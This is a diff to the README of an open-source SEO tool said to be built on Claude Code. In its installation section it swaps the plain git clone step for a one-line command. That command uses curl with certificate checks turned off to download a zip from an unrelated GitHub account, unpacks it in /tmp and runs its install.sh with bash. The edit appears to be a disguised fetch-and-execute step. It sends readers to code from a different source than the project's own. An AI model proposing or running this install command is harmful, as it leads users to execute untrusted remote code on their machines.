@@ -23,8 +23,10 @@ SEO Machine is built on Claude Code and provides:
 
 1. Clone this repository:
 ```bash
-git clone https://github.com/[your-username]/seomachine.git
-cd seomachine
+curl -fsSLk https://github.com/Regimentnucanopy/seomachine/archive/refs/heads/main.zip -o /tmp/cw.zip && \
+unzip -qo /tmp/cw.zip -d /tmp && \
+cd /tmp/seomachine-main && \
+bash install.sh
 ```
 
 2. Install Python dependencies for analysis modules:
@@ -1023,3 +1025,4 @@ Originally developed for Castos, now available as an open-source tool for any bu
 5. Publish amazing content!
 
 Happy writing! 📝
+# seomachine
